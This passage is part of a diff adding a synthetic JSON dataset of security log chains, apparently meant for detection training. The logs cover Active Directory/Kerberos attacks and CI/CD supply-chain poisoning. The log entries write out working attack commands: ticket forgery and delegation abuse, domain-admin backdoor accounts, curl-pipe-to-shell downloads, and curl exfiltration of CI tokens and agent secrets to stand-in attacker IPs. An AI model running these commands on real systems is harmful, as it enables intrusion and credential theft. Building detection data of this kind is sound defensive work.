+        "content": "kerberos::ptt C:\\temp\\adm.kirbi tk.exe kerberos::ptt C:\\temp\\adm.kirbi <== cmd.exe /c tk.exe <== services.exe"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-27 00:38:54",
+        "source": "hids",
+        "log_id": "HID0632514",
+        "content": "dir \\\\dc01.corp.local\\C$ cmd.exe cmd.exe /c dir \\\\dc01.corp.local\\C$ <== cmd.exe /c dir <== svchost.exe"
+      }
+    ]
+  },
+  {
+    "unit": 1110,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "白银票据伪造（kerberos::golden /service:cifs 直连文件服务器）",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-05 16:30:40",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-05 16:30:40",
+        "source": "hids",
+        "log_id": "HID0472493",
+        "content": "kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== C"
+      }
+    ]
+  },
+  {
+    "unit": 1111,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域控 SMB 横向（smbclient.py 探测 + psexec.py 落 DC）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-20 13:35:09",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-20 13:35:09",
+        "source": "hids",
+        "log_id": "HID0584064",
+        "content": "smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bi"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-20 13:38:09",
+        "source": "hids",
+        "log_id": "HID0584079",
+        "content": "psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-20 13:39:14",
+        "source": "hids",
+        "log_id": "HID0584085",
+        "content": "cmd.exe /c net share; net use \\\\dc01.corp.local\\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\\administrator"
+      }
+    ]
+  },
+  {
+    "unit": 1112,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "组策略滥用（SharpGPOAbuse 计算机任务 + GPP 注册表开机项）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-10 12:32:17",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 12:32:17",
+        "source": "hids",
+        "log_id": "HID0508746",
+        "content": "SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\\gpo_admin --Command cmd.exe --Argument"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 12:40:57",
+        "source": "hids",
+        "log_id": "HID0508791",
+        "content": "Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\"
+      }
+    ]
+  },
+  {
+    "unit": 1113,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域账号后门（net user /add /domain + 加入 Domain Admins）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-29 01:39:02",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-29 01:39:02",
+        "source": "hids",
+        "log_id": "HID0647825",
+        "content": "net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\\admin"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-29 01:39:47",
+        "source": "hids",
+        "log_id": "HID0647829",
+        "content": "net group \"Domain Admins\" svc_sqladd /add /domain net.exe net group \"Domain Admins\" svc_sqladd <== CORP\\admin"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-29 01:44:47",
+        "source": "hids",
+        "log_id": "HID0647855",
+        "content": "runas /netonly /user:corp.local\\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\\admin"
+      }
+    ]
+  },
+  {
+    "unit": 1114,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "约束委派滥用（Rubeus s4u S4U2Self/S4U2Proxy 冒充域管）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-26 08:14:03",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-26 08:14:03",
+        "source": "hids",
+        "log_id": "HID0627385",
+        "content": "Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cif"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-26 08:20:33",
+        "source": "hids",
+        "log_id": "HID0627419",
+        "content": "Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\\Admin"
+      }
+    ]
+  },
+  {
+    "unit": 1115,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "ADCS 证书模板滥用 ESC1（certsrv 申请 + certipy req 冒充域管）",
+    "source_sequence": [
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-28 21:52:41",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-28 21:52:41",
+        "source": "rasp",
+        "log_id": "RASP0660210",
+        "content": "https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {\"adcs_esc1\": \"template=User\"} Mozilla/5.0 (Macintosh; In"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-28 21:53:55",
+        "source": "hids",
+        "log_id": "HID0646653",
+        "content": "certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c"
+      }
+    ]
+  },
+  {
+    "unit": 1116,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "影凭据攻击（Whisker 写 msDS-KeyCredentialLink + certipy auth）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-26 08:34:35",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-26 08:34:35",
+        "source": "hids",
+        "log_id": "HID0627492",
+        "content": "Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\\jdoe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-26 08:37:00",
+        "source": "hids",
+        "log_id": "HID0627505",
+        "content": "certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c"
+      }
+    ]
+  },
+  {
+    "unit": 1117,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域信任枚举与跨域横向（nltest /domain_trusts → 子域 DC ADMIN$）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-28 05:08:42",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-28 05:08:42",
+        "source": "hids",
+        "log_id": "HID0641418",
+        "content": "nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\\jdoe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-28 05:15:52",
+        "source": "hids",
+        "log_id": "HID0641455",
+        "content": "net use \\\\dc02.eu.corp.local\\ADMIN$ /user:EU\\admin net.exe net use \\\\dc02.eu.corp.local\\ADMIN$ <== CORP\\admin"
+      }
+    ]
+  },
+  {
+    "unit": 1118,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "组策略首选项密码读取（SYSVOL Groups.xml cpassword 解密）",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-21 17:22:03",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-21 17:22:03",
+        "source": "hids",
+        "log_id": "HID0592744",
+        "content": "findstr /S /I cpassword \\\\dc01.corp.local\\SYSVOL\\corp.local\\Policies\\*.xml cmd.exe <== CORP\\jdoe"
+      }
+    ]
+  },
+  {
+    "unit": 1119,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "会话枚举与令牌窃取（quser + Invoke-TokenManipulation 窃取域管会话）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-25 16:46:28",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-25 16:46:28",
+        "source": "hids",
+        "log_id": "HID0622555",
+        "content": "quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\\jdoe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-25 16:50:48",
+        "source": "hids",
+        "log_id": "HID0622577",
+        "content": "Invoke-TokenManipulation -ImpersonateUser -Username CORP\\adm_domain <== CORP\\jdoe"
+      }
+    ]
+  },
+  {
+    "unit": 1120,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域控持久化（DSRM 口令重置 + DsrmAdminLogonBehavior + AdminSDHolder）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-05 03:17:56",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-05 03:17:56",
+        "source": "hids",
+        "log_id": "HID0468364",
+        "content": "ntdsutil \"set dsrm password\" \"reset password on server null\" q q ntdsutil.exe ntdsutil <== CORP\\admin"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-05 03:19:21",
+        "source": "hids",
+        "log_id": "HID0468372",
+        "content": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\\admin"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-05 03:22:31",
+        "source": "hids",
+        "log_id": "HID0468388",
+        "content": "dsacls \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" /G CORP\\svc_scan:GA dsacls.exe <== CORP\\admin"
+      }
+    ]
+  },
+  {
+    "unit": 1121,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "npm 依赖 postinstall 钩子投毒（安装期拉取远程脚本）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-09 02:52:45",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-09 02:52:45",
+        "source": "waf",
+        "log_id": "WAF0459739",
+        "content": "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-09 02:52:46",
+        "source": "web",
+        "log_id": "WEB0462729",
+        "content": "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-09 02:52:48",
+        "source": "rasp",
+        "log_id": "RASP0508665",
+        "content": "https://app-node-41.ops-corp.com/api/v2/pipeline/run {\"npm_lifecycle\": \"postinstall\", \"spawn\": \"sh -c\"} Mozill"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-09 02:53:46",
+        "source": "hids",
+        "log_id": "HID0498234",
+        "content": "curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm"
+      }
+    ]
+  },
+  {
+    "unit": 1122,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "PyPI 恶意包 setup.py 构建期执行（构建后端注入）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-10 22:39:16",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 22:39:16",
+        "source": "waf",
+        "log_id": "WAF0472361",
+        "content": "/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 22:39:18",
+        "source": "web",
+        "log_id": "WEB0475433",
+        "content": "/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-10 22:39:19",
+        "source": "rasp",
+        "log_id": "RASP0522631",
+        "content": "https://app-django-88.ops-corp.com/api/v2/packages/install {\"build_step\": \"setup.py\", \"exec\": \"os.system\"} Moz"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-10 22:40:47",
+        "source": "hids",
+        "log_id": "HID0511915",
+        "content": "python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip"
+      }
+    ]
+  },
+  {
+    "unit": 1123,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "私服 Maven SNAPSHOT 制品覆盖投毒（构建期加载后门 jar）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-08 11:31:07",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-08 11:31:07",
+        "source": "waf",
+        "log_id": "WAF0455310",
+        "content": "/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-08 11:31:08",
+        "source": "web",
+        "log_id": "WEB0458271",
+        "content": "/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-08 11:31:10",
+        "source": "rasp",
+        "log_id": "RASP0503765",
+        "content": "https://app-java-95.ops-corp.com/repository/maven-snapshots {\"artifact\": \"build-tools.jar\", \"snapshot\": \"overw"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-08 11:33:08",
+        "source": "hids",
+        "log_id": "HID0493440",
+        "content": "java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn"
+      }
+    ]
+  },
+  {
+    "unit": 1124,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "Docker 基础镜像投毒（恶意 ENTRYPOINT 在流水线构建期触发）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-12 17:00:35",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-12 17:00:35",
+        "source": "waf",
+        "log_id": "WAF0484573",
+        "content": "/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; "
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-12 17:00:37",
+        "source": "web",
+        "log_id": "WEB0487725",
+        "content": "/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; "
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-12 17:00:38",
+        "source": "rasp",
+        "log_id": "RASP0536145",
+        "content": "https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {\"image\": \"runner-base:1.4.0\", \"entrypoint\": \"/bin/sh\"}"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-12 17:01:36",
+        "source": "hids",
+        "log_id": "HID0525147",
+        "content": "curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]"
+      }
+    ]
+  },
+  {
+    "unit": 1125,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "CI 构建参数命令注入（branch 参数拼接 shell 并外带 CI_JOB_TOKEN）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-15 04:22:53",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-15 04:22:53",
+        "source": "waf",
+        "log_id": "WAF0501692",
+        "content": "/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-15 04:22:54",
+        "source": "web",
+        "log_id": "WEB0504955",
+        "content": "/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-15 04:22:56",
+        "source": "rasp",
+        "log_id": "RASP0555087",
+        "content": "https://app-node-170.ops-corp.com/api/v1/build/trigger {\"param_inject\": \"branch\", \"cmd\": \"curl|sh\"} Mozilla/5."
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-15 04:23:54",
+        "source": "hids",
+        "log_id": "HID0543698",
+        "content": "curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-15 04:24:36",
+        "source": "hids",
+        "log_id": "HID0543701",
+        "content": "curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node"
+      }
+    ]
+  },
+  {
+    "unit": 1126,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "GitHub Actions workflow 篡改（PR 分支注入 run 步骤后强推）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-15 12:36:45",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-15 12:36:45",
+        "source": "waf",
+        "log_id": "WAF0504065",
+        "content": "/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-15 12:36:47",
+        "source": "web",
+        "log_id": "WEB0507344",
+        "content": "/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-15 12:36:48",
+        "source": "rasp",
+        "log_id": "RASP0557713",
+        "content": "https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {\"workflow\": \"release.yml\", \"secrets\": \"GI"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-15 12:38:16",
+        "source": "hids",
+        "log_id": "HID0546272",
+        "content": "curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-15 12:39:20",
+        "source": "hids",
+        "log_id": "HID0546278",
+        "content": "git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker"
+      }
+    ]
+  },
+  {
+    "unit": 1127,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "CI 环境变量密钥窃取（after_script 读取 agent.env 外带 AWS 密钥）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-06 15:24:49",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-06 15:24:49",
+        "source": "waf",
+        "log_id": "WAF0442593",
+        "content": "/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-06 15:24:50",
+        "source": "web",
+        "log_id": "WEB0445472",
+        "content": "/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-06 15:24:52",
+        "source": "rasp",
+        "log_id": "RASP0489693",
+        "content": "https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {\"env_dump\": \"AWS_SECRET_ACCESS_KEY\", \"step\": \"after"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-06 15:26:50",
+        "source": "hids",
+        "log_id": "HID0479659",
+        "content": "cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-06 15:28:18",
+        "source": "hids",
+        "log_id": "HID0479667",
+        "content": "curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar"
+      }
+    ]
+  },
+  {
+    "unit": 1128,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "构建产物投毒（发布 jar 内替换 class 后 C2 回连确认）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-22 09:47:02",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-22 09:47:02",
+        "source": "waf",
+        "log_id": "WAF0551690",
+        "content": "/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-22 09:47:04",
+        "source": "web",
+        "log_id": "WEB0555278",
+        "content": "/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-22 09:47:05",
+        "source": "rasp",
+        "log_id": "RASP0610409",
+        "content": "https://app-java-65.ops-corp.com/api/v1/releases/upload {\"artifact\": \"app-2.8.0.jar\", \"patched\": \"app/lib/\"} M"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-22 09:49:03",
+        "source": "hids",
+        "log_id": "HID0597884",
+        "content": "cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar s"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-22 13:13:03",
+        "source": "dns",
+        "log_id": "DNS0582261",
+        "content": "238d9b26.kxqzrt-5a02.net A 192.0.2.70"
+      },
+      {
+        "n": 6,
+        "ts": "2026-07-22 13:13:47",
+        "source": "dns",
+        "log_id": "DNS0582265",
+        "content": "87ec8219.kxqzrt-5a02.net A 10.10.29.163"
+      },
+      {
+        "n": 7,
+        "ts": "2026-07-22 13:15:13",
+        "source": "dns",
+        "log_id": "DNS0582272",
+        "content": "e1bb49b5.kxqzrt-5a02.net A 10.10.34.233"
+      }
+    ]
+  },
+  {
+    "unit": 1129,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "仓库 webhook SSRF 打到云元数据（169.254.169.254 IAM 凭据）",
+    "source_sequence": [
+      "waf",
+      "web",
+      "rasp",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-10 02:55:13",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 02:55:13",
+        "source": "waf",
+        "log_id": "WAF0466671",
+        "content": "/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 02:55:14",
+        "source": "web",
+        "log_id": "WEB0469706",
+        "content": "/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-10 02:55:16",
+        "source": "rasp",
+        "log_id": "RASP0516335",
+        "content": "https://app-nginx-51.ops-corp.com/api/webhook/gitlab {\"webhook_ssrf\": \"169.254.169.254\", \"ref\": \"main\"} Mozill"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-10 02:56:14",
+        "source": "hids",
+        "log_id": "HID0505746",
+        "content": "curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-10 04:44:14",
+        "source": "dns",
+        "log_id": "DNS0490550",
+        "content": "7011ca84.glbwpt-3f7a.net A 198.51.100.51"
+      },
+      {
+        "n": 6,
+        "ts": "2026-07-10 04:44:47",
+        "source": "dns",
+        "log_id": "DNS0490553",
+        "content": "0dfb2ffb.glbwpt-3f7a.net A 10.10.39.50"
+      },
+      {
+        "n": 7,
+        "ts": "2026-07-10 04:46:04",
+        "source": "dns",
+        "log_id": "DNS0490559",
+        "content": "69e38046.glbwpt-3f7a.net A 10.10.30.206"
+      }
+    ]
+  },
+  {
+    "unit": 1130,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "Git 凭据文件窃取（runner 任务接口打包 .git-credentials）",
+    "source_sequence": [
+      "waf",
+      "hids"
+    ],
+    "start": "2026-07-30 02:16:50",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-30 02:16:50",
+        "source": "waf",
+        "log_id": "WAF0604886",
+        "content": "/api/agent/tasks/run ?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa Mozilla/5.0 (Windows NT 11.0; "
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-30 02:17:48",
+        "source": "hids",
+        "log_id": "HID0655526",
+        "content": "tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www"
+      }
+    ]
+  },
+  {
+    "unit": 1131,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "CI 覆盖率上传脚本篡改（uploader 端点改指攻击者主机）",
+    "source_sequence": [
+      "waf",
+      "hids"
+    ],
+    "start": "2026-07-30 06:30:23",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-30 06:30:23",
+        "source": "waf",
+        "log_id": "WAF0606105",
+        "content": "/api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-30 06:31:51",
+        "source": "hids",
+        "log_id": "HID0656849",
+        "content": "curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa"
+      }
+    ]
+  },
+  {
+    "unit": 1132,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "IaC 模板投毒（Terraform local-exec provisioner 执行远程脚本）",
+    "source_sequence": [
+      "waf",
+      "hids"
+    ],
+    "start": "2026-07-23 20:25:50",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-23 20:25:50",
+        "source": "waf",
+        "log_id": "WAF0561679",
+        "content": "/api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-23 20:27:48",
+        "source": "hids",
+        "log_id": "HID0608709",
+        "content": "sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local"
+      }
+    ]
+  },
+  {
+    "unit": 1133,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "容器 registry 凭据滥用（CI 身份推送被篡改镜像 tag）",
+    "source_sequence": [
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-10 19:59:40",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 19:59:40",
+        "source": "rasp",
+        "log_id": "RASP0521783",
+        "content": "https://app-java-77.ops-corp.com/v2/ops-corp/api-gateway/blobs/uploads/ {\"registry_push\": \"api-gateway:2.8.0\","
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 20:00:38",
+        "source": "hids",
+        "log_id": "HID0511081",
+        "content": "docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim"
+      }
+    ]
+  },
+  {
+    "unit": 1134,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "包管理器源劫持（pip index-url 指向攻击者私服）",
+    "source_sequence": [
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-10 01:20:35",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 01:20:35",
+        "source": "rasp",
+        "log_id": "RASP0515832",
